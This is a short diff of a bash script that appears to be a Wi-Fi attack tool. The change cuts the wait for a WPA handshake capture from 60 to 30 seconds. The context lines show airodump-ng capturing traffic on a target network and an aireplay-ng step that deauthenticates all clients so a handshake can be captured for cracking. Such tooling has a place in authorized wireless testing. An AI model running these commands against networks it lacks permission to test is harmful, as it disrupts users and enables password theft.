@@ -190,7 +190,7 @@ function handshake() {
 	xterm -hold -e "airodump-ng -c $channel -w capture_$bssid --bssid $bssid $network_card" &
 	airodump_filter_xterm_pid=$!
 	gum confirm "Do you want to start aireplay-ng to deauthenticate all clients?" && deauthenticate_all_clients || echo -e "\n${yellow}[!]${nc} Skipping deauthentication..."
-	handshake_wait=60
+	handshake_wait=30
 	gum spin --timeout=${handshake_wait}s --title="Waiting handshake for ${handshake_wait} seconds..." sleep ${handshake_wait}
 
 	if eapol_has_captured; then
